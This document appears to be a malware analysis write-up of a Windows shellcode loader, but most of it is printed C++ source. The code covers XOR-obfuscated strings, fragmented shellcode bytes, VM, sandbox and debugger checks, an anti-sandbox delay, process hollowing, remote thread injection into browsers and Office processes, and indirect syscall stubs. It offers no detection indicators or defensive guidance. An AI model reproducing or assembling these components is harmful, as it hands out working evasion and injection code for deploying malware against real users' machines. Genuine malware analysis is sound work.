

# Technical Documentation of the Malware

## General Architecture

The analyzed malware is designed with a modular architecture that allows high evasion of detection and analysis systems. Its structure consists of several key components:

### 1. Dynamic API Loading Structure
```cpp
struct APIAddresses {
    // kernel32.dll
    HMODULE(WINAPI *LoadLibraryA)(LPCSTR);
    FARPROC(WINAPI *GetProcAddress)(HMODULE, LPCSTR);
    // ... more APIs
};
```

This structure stores pointers to critical system functions that are resolved dynamically during execution, thus avoiding static detection of imports.

### 2. Obfuscation System
The malware implements an XOR-based obfuscation system for:
- Text strings
- Shellcode
- Function and process names

```cpp
constexpr std::array<unsigned char, 16> encryptionKeyTC = {
    0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x00, 0x11, 0x22,
    0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99
};

template <size_t N>
class EncryptedString {
    // Implementation of compile-time encrypted strings
};
```

### 3. Anti-Analysis Module
Implements multiple techniques to detect and evade analysis environments:
- Virtual machine detection
- Sandbox detection
- Debugger detection
- API hook detection

## Execution Workflow

The malware's execution flow follows a carefully designed sequence to maximize its effectiveness and evasion:

### 1. Initialization
```cpp
int main() {
    // Initialize the APIs
    if (!InitializeAPIs()) {
        std::cout << "Error initializing APIs" << std::endl;
        return 0;
    }
    // ...
}
```

The malware begins by dynamically loading all necessary APIs through the `InitializeAPIs()` function, which uses symbol resolution techniques without directly calling `GetProcAddress`.

### 2. Hostile Environment Detection
```cpp
if (IsRunningInVM() || IsRunningInSandbox() || APIs.IsDebuggerPresent() || 
    CheckRemoteDebuggerPresent() || DetectAPIHooks()) {
    // If we're in an analysis environment, execute benign code
    APIs.MessageBoxA(NULL, "Hello World", "Message", MB_OK);
    return 0;
}
```

It performs a series of checks to determine if it's running in an analysis environment. If it detects any anomalies, it executes benign code to avoid detection.

### 3. Anti-Sandbox Delay
```cpp
AntiSandboxDelay();
```

Implements a variable delay in execution to evade automated sandbox analysis, which usually has time limits.

### 4. Payload Preparation
```cpp
// Combine shellcode parts
unsigned char* combinedShellcode = new unsigned char[shellcodeSize];
CombineShellcode(combinedShellcode);

// Encrypt the combined shellcode
XorCrypt(combinedShellcode, shellcodeSize, encryptionKey, sizeof(encryptionKey));
```

Combines the multiple parts of the shellcode and encrypts it to avoid detection.

### 5. Payload Injection
The malware implements multiple injection techniques, trying them in order:

#### 5.1 Process Hollowing
```cpp
if (ProcessHollowing(combinedShellcode, shellcodeSize)){
    std::cout << "PH completed" << std::endl;
    return 0;
}
```

The most sophisticated technique it uses is Process Hollowing, which consists of:
1. Creating a legitimate process in a suspended state
2. Emptying its memory space
3. Replacing it with the malicious payload
4. Modifying the entry point
5. Resuming execution

#### 5.2 Remote Process Injection
```cpp
if (InjectIntoProcess(combinedShellcode, shellcodeSize)) {
    std::cout << "Injection completed" << std::endl;
    delete[] combinedShellcode;
    return 0;
}
```

If Process Hollowing fails, it attempts to inject the code into running legitimate processes such as notepad.exe, mspaint.exe, etc.

#### 5.3 Local Execution
```cpp
// If injection fails, use local memory technique
SIZE_T size = shellcodeSize;
LPVOID memory = NULL;

// Allocate memory using indirect syscall
NTSTATUS status = APIs.NtAllocateVirtualMemory(GetCurrentProcess(), &memory, 0, &size, 
                                              MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
```

As a last resort, it executes the payload in its own process's memory space.

## Techniques Used

### 1. Obfuscation and Evasion

#### 1.1 String Encryption
Uses an XOR encryption system for text strings, preventing static analysis from detecting suspicious strings.

```cpp
#define ENC_STR(str) []() { \
    constexpr auto encrypted = encrypt_string(str, sizeof(str) - 1); \
    constexpr EncryptedString<encrypted.size()> es(encrypted); \
    return es; \
}()
```

#### 1.2 Fragmented Shellcode
The shellcode is divided into 22 different parts to evade antivirus signatures:

```cpp
unsigned char part1[] = { 0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xcc,0x00,0x00,0x00,0x41 };
unsigned char part2[] = { 0x51,0x41,0x50,0x52,0x48,0x31,0xd2,0x51,0x56,0x65,0x48,0x8b,0x52,0x60 };
// ... more parts
```

#### 1.3 Dynamic API Loading
Avoids using static imports, resolving functions at runtime:

```cpp
HMODULE GetModuleBaseAddress(const char* moduleName) {
    // Get the current process's PEB
#ifdef _WIN64
    PPEB peb = (PPEB)__readgsqword(0x60);
#else
    PPEB peb = (PPEB)__readfsdword(0x30);
#endif
    // ...
}
```

### 2. Anti-Analysis Techniques

#### 2.1 Virtual Machine Detection
```cpp
bool IsRunningInVM() {
    // Check number of processors
    if (si.dwNumberOfProcessors < 2) {
        return true;
    }
    
    // Check amount of RAM
    if (memStatus.ullTotalPhys < 2147483648ULL) { // 2GB
        return true;
    }
    
    // Check common virtual devices
    if (strstr(buffer, ENC_STR("VBOX")) || 
        strstr(buffer, ENC_STR("VMWARE")) || 
        strstr(buffer, ENC_STR("VIRTUAL")) || 
        // ...
}
```

#### 2.2 Sandbox Detection
```cpp
bool IsRunningInSandbox() {
    // Check system uptime
    DWORD uptime = GetTickCount();
    if (uptime < 600000) { // Less than 10 minutes
        return true;
    }
    
    // Check analysis-related processes
    if (_stricmp(pe32.szExeFile, ENC_STR("procexp.exe")) == 0 ||
        _stricmp(pe32.szExeFile, ENC_STR("wireshark.exe")) == 0 ||
        // ...
}
```

#### 2.3 Debugger Detection
```cpp
bool IsDebuggerPresentCustom() {
    return ::IsDebuggerPresent() != FALSE;
}

bool CheckRemoteDebuggerPresent() {
    HANDLE hProcess = GetCurrentProcess();
    BOOL debuggerPresent = FALSE;
    CheckRemoteDebuggerPresent(hProcess, &debuggerPresent);
    return debuggerPresent != FALSE;
}
```

### 3. Injection Techniques

#### 3.1 Process Hollowing
This is the most sophisticated technique implemented by the malware:

```cpp
bool ProcessHollowing(unsigned char* shellcode, DWORD shellcodeSize) {
    // 1. Create the process in a suspended state
    if (!CreateProcessA(systemPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, 
                        NULL, NULL, &si, &pi)) {
        return false;
    }
    
    // 2. Get the process's image base address
    PVOID imageBaseAddress;
    if (!GetProcessImageBase(pi.hProcess, &imageBaseAddress)) {
        return false;
    }
    
    // 3. Read the process's PE header
    // ...
    
    // 4. Free the original process's memory
    if (!VirtualFreeEx(pi.hProcess, imageBaseAddress, 0, MEM_RELEASE)) {
        return false;
    }
    
    // 5. Allocate new memory for the shellcode
    pNewImageBase = VirtualAllocEx(pi.hProcess, imageBaseAddress, shellcodeSize, 
                                  MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    // 6. Write the shellcode to the process's memory
    if (!WriteProcessMemory(pi.hProcess, pNewImageBase, decryptedShellcode, 
                           shellcodeSize, NULL)) {
        return false;
    }
    
    // 7. Modify the thread context to point to the new code
    CONTEXT context;
    context.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &context);
    
#ifdef _WIN64
    context.Rcx = (DWORD64)pNewImageBase;
#else
    context.Eax = (DWORD)pNewImageBase;
#endif
    
    // 8. Update the thread context
    SetThreadContext(pi.hThread, &context);
    
    // 9. Resume process execution
    ResumeThread(pi.hThread);
    
    return true;
}
```

#### 3.2 Remote Process Injection
```cpp
bool InjectIntoProcess(unsigned char* shellcode, DWORD size) {
    // 1. Search for target processes
    const char* targetProcesses[] = {
        "notepad.exe", "mspaint.exe", "write.exe", "winword.exe", "excel.exe",
        "chrome.exe", "firefox.exe", "msedge.exe", "iexplore.exe", 
    };
    
    // 2. Open the process with appropriate permissions
    process = APIs.OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | 
                              PROCESS_CREATE_THREAD, FALSE, processEntry.th32ProcessID);
    
    // 3. Allocate memory in the remote process
    LPVOID remoteMem = APIs.VirtualAllocEx(process, NULL, size, MEM_COMMIT | MEM_RESERVE, 
                                          PAGE_EXECUTE_READWRITE);
    
    // 4. Write shellcode to the remote process
    APIs.WriteProcessMemory(process, remoteMem, decryptedShellcode, size, NULL);
    
    // 5. Create remote thread to execute the shellcode
    HANDLE thread = APIs.CreateRemoteThread(process, NULL, 0, 
                                           (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
    
    return true;
}
```

### 4. Execution Techniques

#### 4.1 Indirect Syscalls
```cpp
NTSTATUS DynamicSyscall(DWORD syscallNumber, HANDLE ProcessHandle, PVOID* BaseAddress, 
                       ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect) {
    // Build dynamic syscall stub
    BYTE syscallStub[] = {
        0x4C, 0x8B, 0xD1,               // mov r10, rcx
        0xB8, 0x00, 0x00, 0x00, 0x00,   // mov eax, syscallNumber
        0x0F, 0x05,                     // syscall
        0xC3                            // ret
    };
    
    // Insert syscall number
    *(DWORD*)(syscallStub + 5) = syscallNumber;
    
    // Execute stub
    void* execMem = VirtualAlloc(NULL, sizeof(syscallStub), MEM_COMMIT | MEM_RESERVE, 
                                PAGE_EXECUTE_READWRITE);
    memcpy(execMem, syscallStub, sizeof(syscallStub));
    
    typedef NTSTATUS(*SyscallFunc)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
    SyscallFunc syscallFunc = (SyscallFunc)execMem;
    result = syscallFunc(ProcessHandle, BaseAddress, ZeroBits, RegionSize, 
                         AllocationType, Protect);
    
    VirtualFree(execMem, 0, MEM_RELEASE);
    return result;
}
```

## Conclusions

The analyzed malware represents a sophisticated threat that implements multiple evasion and persistence techniques. Its modular architecture and its ability to adapt to different environments make it particularly difficult to detect and analyze. The Process Hollowing techniques and dynamic API loading are especially notable for their effectiveness in evading detection systems.

The implementation of multiple layers of obfuscation, along with anti-analysis techniques, demonstrate a high level of knowledge on the part of its developers about the internal workings of Windows and malware analysis methodologies.